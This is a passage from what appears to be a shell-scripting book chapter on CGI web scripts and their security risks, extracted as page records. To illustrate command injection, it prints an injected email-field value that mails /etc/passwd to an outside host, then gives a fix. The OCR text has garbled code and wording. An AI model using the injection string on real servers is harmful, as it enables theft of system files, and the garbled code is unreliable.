  md: '# 8


    # WEBMASTER HACKS


    ![](img/a236915495daab651d7c2cc28becf416_219_0.png)


    In addition to offering a great environment for building nifty command-line-based
    tools that work with various Internet sites, shell scripts can also change the
    way your own website works, starting with some simple debugging tools and expanding
    to the creation of web pages on demand, a photo album browser that automatically
    incorporates new images uploaded to the server, and more.


    All of these uses of the shell for Common Gateway Interface (CGI) scripts share
    one common trait, however: They require you to be conscious and aware of possible
    security risks. The most common hack that can catch an unaware web developer is
    the exploitation of the command line, accessed within the scripts.'
  merge: -1
  pgno: 219
- img_proc: true
  md: 'Consider this benign example: On a web page, you have a form for people to
    fill out. One of the fields is their email address, and within your script you
    not store their information within a local database, you also mention them an
    acknowledgment:


    ```

    echo "Subject: Thanks for your signup"

    echo "To: $email ($name)"

    echo ""

    echo "Thanks for signing up. You''ll hear from us shortly."

    echo -- Dave and the team"

    )| sendmail $email

    ```


    Seems innocent, doesn''t it? Now imagine what would happen if the email address,
    instead of taylor@intuitive.com, was entered as


    ```

    sendmail d0d37@das-hak.de < /etc/passwd; echo taylor@intuitive.com

    ```


    Can you see the danger lurking in that? Rather than just sending the short email
    to the address, this sends a copy of your /etc/passwd file to a delinquent @das-hak.de,
    who then uses the base of a determined attack on your system security.


    As result, many CGI scripts are written in more security-conscious environments,
    including the --enabled Perl world, in which the script fails if data is utilized
    from an external source without being "scrubbed" or secured.


    But this lack of security features doesn''t prevent shell scripts from being equal
    partners in the world of web security. It means that you need to be thoughtful
    and conscious of problems might creep in and eliminate them. For example, a tiny
    change in the script just shown would prevent potential hooligans from providing
    bad external data:


    ```

    echo "Subject: Thanks for your signup"

    echo "To: $email ($name)"

    echo ""

    echo "Thanks for signing up. You''ll hear from us shortly."

    echo -- Dave and the team"

    )| sendmail -t

    ```


    The -t flag to sendmail tells the program to send message itself for destination
    email addresses. The backquoted material never sees the light of a command line,
    as it''s interpreted as an invalid email address within the sendmail queuing system
    (and then safely ends up in a log file).


    Another safety mechanism requires that information from the web browser to the
    server be encoded; a backquote, for example, would actually be sent to the server
    (and handed off to the CGI script) at %60, which can certainly be safely handled
    by a shell script without danger.


    One common characteristic of all the CGI scripts in this chapter is that they
    do very, little decoding of the encoded strings: Spaces are encoded with + for
    transmission, so switching them back to spaces is safe. The @ character in email
    addresses is sent as $40, so that''s safely transformed back too. Other than'
  merge: -1
  pgno: 220
- img_proc: true
  md: 'that, the scrubbed string can safely be scanned for the presence of a % and
    generate an error if encountered. This is highlighted in the code used in Script
    #72, Processing Contact Forms.


    Ultimately, highly sophisticated websites will use more robust and powerful tools
    than the shell, but with many of the solutions in this book, a 20-to-30 line script
    can often be enough to validate an idea, prove a concept, or solve a simple problem
    in a fast, portable, and reasonably manner.


    # **NOTE**


    **Try them online!**

    *You can explore many of the scripts in this chapter at http://www.intuitive.com/wicked/*


    # # Running the Scripts in This Chapter


    To run any of CGI scripts presented in this chapter, you''ll need to do a bit
    more than just name the script appropriately and save it. You must also place
    the script in the proper location, as determined by the configuration of the web
    server running on your system.


    Unless you''re specifically configured your web browser to run .sh scripts as
    CGI programs, you''ll want all of the scripts in this chapter to have a .cgi filename
    suffix. You should save the .cgi files in the desired directory on your web server
    or in /cgi-bin/ directory, all depending on the configuration. It is important
    to note that the .cgi file-naming conventions in this chapter assume that you
    are saving files in your web server''s root directory. If you are saving them
    in /cgi-bin/, you must add /cgi-bin/ to all of the script paths in this chapter.
    For example, script-name.cgi. Finally, you''ll need to ensure that each .cgi script
    is readable and executable by everyone, or on most web servers your web queries
    as user or nobody.


    Of course, you need a web server to run any of these scripts properly. Fortunately,
    just about every cool modern OS includes Apache or something similar, getting
    a server up and running should straightforward. You will need to ensure that the
    script directory on your web server has CGI permission in the server configuration
    file. In Apache, for example, the directory needs to have Option CGI in the httpd.conf
    file for the scripts to work. Ensure that the directory is globally readable and
    executable.


    Of course, the alternative is to use a web server that is not on your machine
    but is already — hopefully — set properly. Talk with your web hosting provider;
    you''ll need access to a web server that not allows you to execute your own CGI
    scripts but also allows you to telnet or (preferably) ssh into the server to tweak
    the scripts. Most hosting companies do not allow this access, due to security
    concerns, but you can find a bunch of possibilities by searching Google for "web
    hosting ssh telnet.".'
